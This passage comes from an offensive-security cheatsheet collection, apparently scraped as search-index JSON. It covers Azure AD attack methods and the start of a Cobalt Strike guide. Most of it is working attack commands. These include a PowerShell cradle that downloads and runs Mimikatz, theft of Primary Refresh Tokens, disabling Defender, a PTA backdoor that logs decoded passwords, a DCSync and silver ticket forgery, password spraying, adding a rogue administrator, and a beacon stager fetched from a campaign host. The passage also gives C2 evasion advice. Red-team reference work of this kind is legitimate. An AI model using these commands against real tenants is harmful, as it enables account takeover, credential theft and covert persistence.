Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).</p> <pre><code># Run mimikatz to obtain the PRT\nPS&gt; iex (New-Object Net.Webclient).downloadstring(\"https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1\")\nPS&gt; Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::cloudap\"'\n# Copy the PRT and KeyValue\nMimikatz&gt; privilege::debug\nMimikatz&gt; token::elevate\nMimikatz&gt; dpapi::cloudapkd /keyvalue:&lt;KeyValue&gt; /unprotect\n# Copy the Context, ClearKey and DerivedKey\nMimikatz&gt; dpapi::cloudapkd /context:&lt;Context&gt; /derivedkey:&lt;DerivedKey&gt; /Prt:&lt;PRT&gt;\n</code></pre> <pre><code># Generate a JWT\nPS&gt; Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1\nPS AADInternals&gt; $PRT_OF_USER = '...'\nPS AADInternals&gt; while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += \"=\"}\nPS AADInternals&gt; $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))\nPS AADInternals&gt; $ClearKey = \"XXYYZZ...\"\nPS AADInternals&gt; $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&amp;,' -split ',' -ne ''))\nPS AADInternals&gt; New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey \u2013GetNonce\neyJ0eXAiOiJKV1QiL...\n</code></pre> <p>The <code>&lt;Signed JWT&gt;</code> (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf.   Edit the Chrome cookie (F12) -&gt; Application -&gt; Cookies with the values:</p> <pre><code>Name: x-ms-RefreshTokenCredential\nValue: &lt;Signed JWT&gt;\nHttpOnly: \u221a\n</code></pre> <p> Mark the cookie with the flags <code>HTTPOnly</code> and <code>Secure</code>.</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#pass-the-certificate","title":"Pass The Certificate","text":"<pre><code>Copy-Item -ToSession $jumpvm -Path C:\\Tools\\PrtToCertmaster.zip -Destination C:\\Users\\Username\\Documents\\username \u2013Verbose\nExpand-Archive -Path C:\\Users\\Username\\Documents\\username\\PrtToCert-master.zip -DestinationPath C:\\Users\\Username\\Documents\\username\\PrtToCert\n# Require the PRT, TenantID, Context and DerivedKey\n&amp; 'C:\\Program Files\\Python39\\python.exe' C:\\Users\\Username\\Documents\\username\\PrtToCert\\RequestCert.py --tenantId &lt;TENANT-ID&gt; --prt &lt;PRT&gt; --userName &lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com --hexCtx &lt;HEX-CONTEXT&gt; --hexDerivedKey &lt;HEX-DERIVED-KEY&gt;\n# PFX saved with the name &lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com.pfx and password AzureADCert\n</code></pre> <p>Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine</p> <p>https://github.com/morRubin/AzureADJoinedMachinePTC</p> <pre><code>Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP\nMain.py --usercert \"admin.pfx\" --certpass password --remoteip 10.10.10.10\npython Main.py --usercert C:\\Users\\Username\\Documents\\username\\&lt;USERNAME&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com.pfx --\ncertpass AzureADCert --remoteip 10.10.10.10 --command \"cmd.exe /c net user username Password@123 /add /Y &amp;&amp; net localgroup administrators username /add\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#intunes-administration","title":"Intunes Administration","text":"<p>Requirements: * Global Administrator or Intune Administrator Privilege : <code>Get-AzureADGroup -Filter \"DisplayName eq 'Intune Administrators'\"</code></p> <ol> <li>Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT</li> <li>Go to Devices -&gt; All Devices to check devices enrolled to Intune</li> <li>Go to Scripts and click on Add for Windows 10. </li> <li>Add a Powershell script</li> <li>Specify Add all users and Add all devices in the Assignments page.</li> </ol> <p> It will take up to one hour before you script is executed !</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#dynamic-group-membership","title":"Dynamic Group Membership","text":"<p>Get groups that allow Dynamic membership: <code>Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}</code></p> <p>Rule example : <code>(user.otherMails -any (_ -contains \"vendor\")) -and (user.userType -eq \"guest\")</code>  Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group</p> <ol> <li>Open user's profile, click on Manage</li> <li>Click on Resend invite and to get an invitation URL</li> <li>Set the secondary email     <pre><code>PS&gt; Set-AzureADUser -ObjectId &lt;OBJECT-ID&gt; -OtherMails &lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com -Verbose\n</code></pre></li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#administrative-unit","title":"Administrative Unit","text":"<p>Administrative Unit can reset password of another user</p> <pre><code>PS AzureAD&gt; Get-AzureADMSAdministrativeUnit -Id &lt;ID&gt;\nPS AzureAD&gt; Get-AzureADMSAdministrativeUnitMember -Id &lt;ID&gt;\nPS AzureAD&gt; Get-AzureADMSScopedRoleMembership -Id &lt;ID&gt; | fl\nPS AzureAD&gt; Get-AzureADDirectoryRole -ObjectId &lt;RoleId&gt;\nPS AzureAD&gt; Get-AzureADUser -ObjectId &lt;RoleMemberInfo.Id&gt; | fl \nPS C:\\Tools&gt; $password = \"Password\" | ConvertToSecureString -AsPlainText -Force\nPS C:\\Tools&gt; (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq \"&lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com\"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#deployment-template","title":"Deployment Template","text":"<pre><code>PS Az&gt; Get-AzResourceGroup\nPS Az&gt; Get-AzResourceGroupDeployment -ResourceGroupName SAP\n# Export\nPS Az&gt; Save-AzResourceGroupDeploymentTemplate -ResourceGroupName &lt;RESOURCE GROUP&gt; -DeploymentName &lt;DEPLOYMENT NAME&gt;\ncat &lt;DEPLOYMENT NAME&gt;.json # search for hardcoded password\ncat &lt;PATH TO .json FILE&gt; | Select-String password\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#application-proxy","title":"Application Proxy","text":"<pre><code># Enumerate application that have Proxy\nPS C:\\Tools&gt; Get-AzureADApplication -All $true | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}\nPS C:\\Tools&gt; Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq \"Finance Management System\"}\nPS C:\\Tools&gt; . C:\\Tools\\GetApplicationProxyAssignedUsersAndGroups.ps1\nPS C:\\Tools&gt; Get-ApplicationProxyAssignedUsersAndGroups -ObjectId &lt;OBJECT-ID&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#application-endpoint","title":"Application Endpoint","text":"<pre><code># Enumerate possible endpoints for applications starting/ending with PREFIX\nPS C:\\Tools&gt; Get-AzureADServicePrincipal -All $true -Filter \"startswith(displayName,'PREFIX')\" | % {$_.ReplyUrls}\nPS C:\\Tools&gt; Get-AzureADApplication -All $true -Filter \"endswith(displayName,'PREFIX')\" | Select-Object ReplyUrls,WwwHomePage,HomePage\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#conditional-access","title":"Conditional Access","text":"<ul> <li>Bypassing conditional access by copying User-Agent (Chrome Dev Tool &gt; Select iPad Pro, etc)</li> <li>Bypassing conditional access by faking device compliance     <pre><code># AAD Internals - Making your device compliant\n# Get an access token for AAD join and save to cache\nGet-AADIntAccessTokenForAADJoin -SaveToCache\n# Join the device to Azure AD\nJoin-AADIntDeviceToAzureAD -DeviceName \"SixByFour\" -DeviceType \"Commodore\" -OSVersion \"C64\"\n# Marking device compliant - option 1: Registering device to Intune\n# Get an access token for Intune MDM and save to cache (prompts for credentials)\nGet-AADIntAccessTokenForIntuneMDM -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache \n# Join the device to Intune\nJoin-AADIntDeviceToIntune -DeviceName \"SixByFour\"\n# Start the call back\nStart-AADIntDeviceIntuneCallback -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName \"SixByFour\"\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad","title":"Azure AD","text":"<p>With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.</p> <ol> <li>Authenticate to your webmail portal (i.e. https://webmail.domain.com/)</li> <li>Change your browser URL to: https://azure.microsoft.com/</li> <li>Pick the account from the active sessions</li> <li>Select Azure Active Directory and enjoy!</li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-vs-active-directory","title":"Azure AD vs Active Directory","text":"Active Directory Azure AD LDAP REST API'S NTLM/Kerberos OAuth/SAML/OpenID Structured directory (OU tree) Flat structure GPO No GPO's Super fine-tuned access controls Predefined roles Domain/forest Tenant Trusts Guests <ul> <li>Password Hash Syncronization (PHS)<ul> <li>Passwords from on-premise AD are sent to the cloud</li> <li>Use replication via a service account created by AD Connect</li> </ul> </li> <li>Pass Through Authentication (PTA)<ul> <li>Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text</li> </ul> </li> <li> <p>Connect Windows Server AD to Azure AD using Federation Server (ADFS)</p> <ul> <li>Dir-Sync : Handled by on-premise Windows Server AD, sync username/password</li> </ul> </li> <li> <p>Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;name=large</p> </li> <li>Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;name=large</li> <li>Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;name=large</li> <li>Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;name=large</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#password-spray","title":"Password Spray","text":"<p>Default lockout policy of 10 failed attempts, locking out an account for 60 seconds</p> <pre><code>git clone https://github.com/dafthack/MSOLSpray\nImport-Module .\\MSOLSpray.ps1\nInvoke-MSOLSpray -UserList .\\userlist.txt -Password Winter2020\nInvoke-MSOLSpray -UserList .\\users.txt -Password d0ntSprayme!\n# UserList  - UserList file filled with usernames one-per-line in the format \"user@domain.com\"\n# Password  - A single password that will be used to perform the password spray.\n# OutFile   - A file to output valid results to.\n# Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.\n# URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#convert-guid-to-sid","title":"Convert GUID to SID","text":"<p>The user's AAD id is translated to SID by concatenating <code>\"S-1\u201312\u20131-\"</code> to the decimal representation of each section of the AAD Id.</p> <pre><code>GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]\nSID: S-1\u201312\u20131-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]\n</code></pre> <p>For example, the representation of <code>6aa89ecb-1f8f-4d92\u2013810d-b0dce30b6c82</code> is <code>S-1\u201312\u20131\u20131789435595\u20131301421967\u20133702525313\u20132188119011</code></p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-connect","title":"Azure AD Connect","text":"<p>Check if Azure AD Connect is installed : <code>Get-ADSyncConnector</code></p> <ul> <li>For PHS, we can extract the credentials</li> <li>For PTA, we can install the agent</li> <li>For Federation, we can extract the certificate from ADFS server using DA</li> </ul> <pre><code>PS &gt; Set-MpPreference -DisableRealtimeMonitoring $true\nPS &gt; Copy-Item -ToSession $adcnct -Path C:\\Tools\\AADInternals.0.4.5.zip -Destination C:\\Users\\Administrator\\Documents\nPS &gt; Expand-Archive C:\\Users\\Administrator\\Documents\\AADInternals.0.4.5.zip -DestinationPath C:\\Users\\Administrator\\Documents\\AADInternals\nPS &gt; Import-Module C:\\Users\\Administrator\\Documents\\AADInternals\\AADInternals.psd1\nPS &gt; Get-AADIntSyncCredentials\n# Get Token for SYNC account and reset on-prem admin password\nPS &gt; $passwd = ConvertToSecureString 'password' -AsPlainText -Force\nPS &gt; $creds = New-Object System.Management.Automation.PSCredential (\"&lt;Username&gt;@&lt;TenantName&gt;.onmicrosoft.com\", $passwd)\nPS &gt; GetAADIntAccessTokenForAADGraph -Credentials $creds \u2013SaveToCache\nPS &gt; Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId\nPS &gt; Set-AADIntUserPassword -SourceAnchor \"&lt;IMMUTABLE-ID&gt;\" -Password \"Password\" -Verbose\n</code></pre> <ol> <li>Check if PTA is installed : <code>Get-Command -Module PassthroughAuthPSModule</code></li> <li>Install a PTA Backdoor     <pre><code>PS AADInternals&gt; Install-AADIntPTASpy\nPS AADInternals&gt; Get-AADIntPTASpyLog -DecodePasswords\n</code></pre></li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-connect-password-extraction","title":"Azure AD Connect - Password extraction","text":"<p>Credentials in AD Sync : C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf</p> Tool Requires code execution on target DLL dependencies Requires MSSQL locally Requires python locally ADSyncDecrypt Yes Yes No No ADSyncGather Yes No No Yes ADSyncQuery No (network RPC calls only) No Yes Yes <pre><code>git clone https://github.com/fox-it/adconnectdump\n# DCSync with AD Sync account\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-connect-msol-accounts-password-and-dcsync","title":"Azure AD Connect - MSOL Account's password and DCSync","text":"<p>You can perform DCSync attack using the MSOL account.</p> <p>Requirements:   * Compromise a server with Azure AD Connect service   * Access to ADSyncAdmins or local Administrators groups</p> <p>Use the script azuread_decrypt_msol.ps1 from @xpn to recover the decrypted password for the MSOL account: * <code>azuread_decrypt_msol.ps1</code>: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545 * <code>azuread_decrypt_msol_v2.ps1</code>: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c</p> <p>Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-connect-seamless-single-sign-on-silver-ticket","title":"Azure AD Connect - Seamless Single Sign On Silver Ticket","text":"<p>Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)</p> <p>Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD.</p> <p> The password of the AZUREADSSOACC account never changes.</p> <p>Using https://autologon.microsoftazuread-sso.com/ to convert Kerberos tickets to SAML and JWT for Office 365 &amp; Azure</p> <ol> <li>NTLM password hash of the AZUREADSSOACC account, e.g. <code>f9969e088b2c13d93833d0ce436c76dd</code>.      <pre><code>mimikatz.exe \"lsadump::dcsync /user:AZUREADSSOACC$\" exit\n</code></pre></li> <li>AAD logon name of the user we want to impersonate, e.g. <code>elrond@contoso.com</code>. This is typically either his userPrincipalName or mail attribute from the on-prem AD.</li> <li>SID of the user we want to impersonate, e.g. <code>S-1-5-21-2121516926-2695913149-3163778339-1234</code>.</li> <li>Create the Silver Ticket and inject it into Kerberos cache:     <pre><code>mimikatz.exe \"kerberos::golden /user:elrond\n/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234\n/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd\n/target:aadg.windows.net.nsatc.net /service:HTTP /ptt\" exit\n</code></pre></li> <li>Launch Mozilla Firefox</li> <li>Go to about:config and set the <code>network.negotiate-auth.trusted-uris preference</code> to value <code>https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com</code></li> <li>Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.</li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#references","title":"References","text":"<ul> <li>Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack</li> <li>Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!</li> <li>Pass-the-PRT attack and detection by Microsoft Defender for \u2026 - Derk van der Woude - Jun 9</li> <li>Azure AD Pass The Certificate - Mor - Aug 19, 2020</li> <li>Get Access Tokens for Managed Service Identity on Azure App Service</li> <li>Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD</li> <li>CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course</li> <li>Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen</li> <li>An introduction to penetration testing Azure - Akimbocore</li> <li>Running Powershell scripts on Azure VM - Netspi</li> <li>Attacking Azure Cloud shell - Netspi</li> <li>Maintaining Azure Persistence via automation accounts - Netspi</li> <li>Detecting an attacks on active directory with Azure - Smartspate</li> <li>Azure AD Overview </li> <li>Windows Azure Active Directory in plain English</li> <li>Building Free Active Directory Lab in Azure - @kamran.bilgrami </li> <li>Attacking Azure/Azure AD and introducing Powerzure - SpecterOps</li> <li>Azure AD connect for RedTeam - @xpnsec</li> <li>Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020</li> <li>Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020</li> <li>Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema</li> <li>Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020</li> <li>AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhi\u00e8re (bak) - 2020-04-20</li> <li>Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</li> <li>The Art of the Device Code Phish - Bobby Cooke</li> <li>AZURE AD cheatsheet - BlackWasp</li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/","title":"Cobalt Strike","text":"<p>Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.</p> <pre><code>$ sudo apt-get update\n$ sudo apt-get install openjdk-11-jdk\n$ sudo apt install proxychains socat\n$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64\n$ sudo ./teamserver 10.10.10.10 \"password\" [malleable C2 profile]\n$ ./cobaltstrike\n$ powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))\" \n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#summary","title":"Summary","text":"<ul> <li>Infrastructure<ul> <li>Redirectors</li> <li>Domain fronting</li> </ul> </li> <li>OpSec<ul> <li>Customer ID</li> </ul> </li> <li>Payloads<ul> <li>DNS Beacon</li> <li>SMB Beacon</li> <li>Metasploit compatibility</li> <li>Custom Payloads</li> </ul> </li> <li>Malleable C2</li> <li>Files</li> <li>Powershell and .NET<ul> <li>Powershell commabds</li> <li>.NET remote execution</li> </ul> </li> <li>Lateral Movement</li> <li>VPN &amp; Pivots</li> <li>Kits<ul> <li>Elevate Kit</li> <li>Persistence Kit</li> <li>Resource Kit</li> <li>Artifact Kit</li> <li>Mimikatz Kit</li> <li>Sleep Mask Kit</li> <li>Thread Stack Spoofer</li> </ul> </li> <li>Beacon Object Files</li> <li>NTLM Relaying via Cobalt Strike</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#infrastructure","title":"Infrastructure","text":""},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#redirectors","title":"Redirectors","text":"<pre><code>sudo apt install socat\nsocat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#domain-fronting","title":"Domain Fronting","text":"<ul> <li>New Listener &gt; HTTP Host Header</li> <li>Choose a domain in \"Finance &amp; Healthcare\" sector </li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#opsec","title":"OpSec","text":"<p>Don't * Use default self-signed HTTPS certificate * Use default port (50050) * Use 0.0.0.0 DNS response * Metasploit compatibility, ask for a payload : <code>wget -U \"Internet Explorer\" http://127.0.0.1/vl6D</code></p> <p>Do * Use a redirector (Apache, CDN, ...) * Firewall to only accept HTTP/S from the redirectors * Firewall 50050 and access via SSH tunnel * Edit default HTTP 404 page and Content type: text/plain * No staging <code>set hosts_stage</code> to <code>false</code> in Malleable C2 * Use Malleable Profile to taylor your attack to specific actors</p>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#customer-id","title":"Customer ID","text":"<p>The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike.</p> <ul> <li>The Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later.</li> <li>The trial has a Customer ID value of 0. </li> <li>Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool</li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#payloads","title":"Payloads","text":""},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#dns-beacon","title":"DNS Beacon","text":"<ul> <li>Edit the Zone File for the domain</li> <li>Create an A record for Cobalt Strike system</li> <li>Create an NS record that points to FQDN of your Cobalt Strike system</li> </ul> <p>Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server's A record.</p> <ul> <li>nslookup jibberish.beacon polling.campaigns.domain.com</li> <li>nslookup jibberish.beacon campaigns.domain.com</li> </ul> <p>Example of DNS on Digital Ocean:</p> <pre><code>NS  example.com                     directs to 10.10.10.10.            86400\nNS  polling.campaigns.example.com   directs to campaigns.example.com.   3600\nA   campaigns.example.com           directs to 10.10.10.10              3600 \n</code></pre> <pre><code>systemctl disable systemd-resolved\nsystemctl stop systemd-resolved\nrm /etc/resolv.conf\necho \"nameserver 8.8.8.8\" &gt;  /etc/resolv.conf\necho \"nameserver 8.8.4.4\" &gt;&gt;  /etc/resolv.conf\n</code></pre> <p>Configuration: 1. host: campaigns.domain.com 2. beacon: polling.campaigns.domain.com 3. Interact with a beacon, and <code>sleep 0</code></p>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#smb-beacon","title":"SMB Beacon","text":"<pre><code>link [host] [pipename]\nconnect [host] [port]\nunlink [host] [PID]\njump [exec] [host] [pipe]\n</code></pre> <p>SMB Beacon uses Named Pipes. You might encounter these error code while running it.</p> Error Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don't have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there."},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#ssh-beacon","title":"SSH Beacon","text":"<pre><code># deploy a beacon\nbeacon&gt; help ssh\nUse: ssh [target:port] [user] [pass]\nSpawn an SSH client and attempt to login to the specified target\nbeacon&gt; help ssh-key\nUse: ssh [target:port] [user] [/path/to/key.pem]\nSpawn an SSH client and attempt to login to the specified target\n# beacon's commands\nupload                    Upload a file\ndownload                  Download a file\nsocks                     Start SOCKS4a server to relay traffic\nsudo                      Run a command via sudo\nrportfwd                  Setup a reverse port forward\nshell                     Execute a command via the shell\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#metasploit-compatibility","title":"Metasploit compatibility","text":"<ul> <li>Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https</li> <li>Set LHOST and LPORT to the beacon</li> <li>Set DisablePayloadHandler to True</li> <li>Set PrependMigrate to True</li> <li>exploit -j</li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#custom-payloads","title":"Custom Payloads","text":"<p>https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c</p> <pre><code>* Attacks &gt; Packages &gt; Payload Generator \n* Attacks &gt; Packages &gt; Scripted Web Delivery (S)\n$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor\n$ C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\dns_raw_stageless_x64.xml\n$ %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \\\\10.10.10.10\\Shared\\dns_raw_stageless_x86.xml\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#malleable-c2","title":"Malleable C2","text":"<p>List of Malleable Profiles hosted on Github * Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles * Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 * Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles * SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint</p> <p>Example of syntax</p> <pre><code>set useragent \"SOME AGENT\"; # GOOD\nset useragent 'SOME AGENT'; # BAD\nprepend \"This is an example;\";\n# Escape Double quotes\nappend \"here is \\\"some\\\" stuff\";\n# Escape Backslashes\nappend \"more \\\\ stuff\";\n# Some special characters do not need escaping\nprepend \"!@#$%^&amp;*()\";\n</code></pre> <p>Check a profile with <code>./c2lint</code>. * A result of 0 is returned if c2lint completes with no errors * A result of 1 is returned if c2lint completes with only warnings * A result of 2 is returned if c2lint completes with only errors * A result of 3 is returned if c2lint completes with both errors and warning</p>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#files","title":"Files","text":"<pre><code># List the file on the specified directory\nbeacon &gt; ls &lt;C:\\Path&gt;\n# Change into the specified working directory\nbeacon &gt; cd [directory]\n# Delete a file\\folder\nbeacon &gt; rm [file\\folder]\n# File copy\nbeacon &gt; cp [src] [dest]\n# Download a file from the path on the Beacon host\nbeacon &gt; download [C:\\filePath]\n# Lists downloads in progress\nbeacon &gt; downloads\n# Cancel a download currently in progress\nbeacon &gt; cancel [*file*]\n# Upload a file from the attacker to the current Beacon host\nbeacon &gt; upload [/path/to/file]\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#powershell-and-net","title":"Powershell and .NET","text":""},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#powershell-commands","title":"Powershell commands","text":"<pre><code># Import a Powershell .ps1 script from the control server and save it in memory in Beacon\nbeacon &gt; powershell-import [/path/to/script.ps1]\n# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.\nbeacon &gt; powershell [commandlet][arguments]\n# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto\nbeacon &gt; powerpick [commandlet] [argument]\n# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs\nbeacon &gt; psinject [pid][arch] [commandlet] [arguments]\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#net-remote-execution","title":".NET remote execution","text":"<p>Run a local .NET executable as a Beacon post-exploitation job. </p> <p>Require: * Binaries compiled with the \"Any CPU\" configuration.</p> <pre><code>beacon &gt; execute-assembly [/path/to/script.exe] [arguments]\nbeacon &gt; execute-assembly /home/audit/Rubeus.exe\n[*] Tasked beacon to run .NET program: Rubeus.exe\n[+] host called home, sent: 318507 bytes\n[+] received output:\n______        _                      \n(_____ \\      | |                     \n_____) )_   _| |__  _____ _   _  ___ \n|  __  /| | | |  _ \\| ___ | | | |/___)\n| |  \\ \\| |_| | |_) ) ____| |_| |___ |\n|_|   |_|____/|____/|_____)____/(___/\nv1.4.2 \n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#lateral-movement","title":"Lateral Movement","text":"<p> OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe </p> <ul> <li>portscan: Performs a portscan on a specific target.</li> <li>runas: A wrapper of runas.exe, using credentials you can run a command as another user.</li> <li>pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \\  This module needs Administrator privileges.</li> <li>steal_token: Steal a token from a specified process.</li> <li>make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.</li> <li>jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \\  The jump module will use the current delegation/impersonation token to authenticate on the remote target. \\  We can combine the jump module with the make_token or pth module for a quick 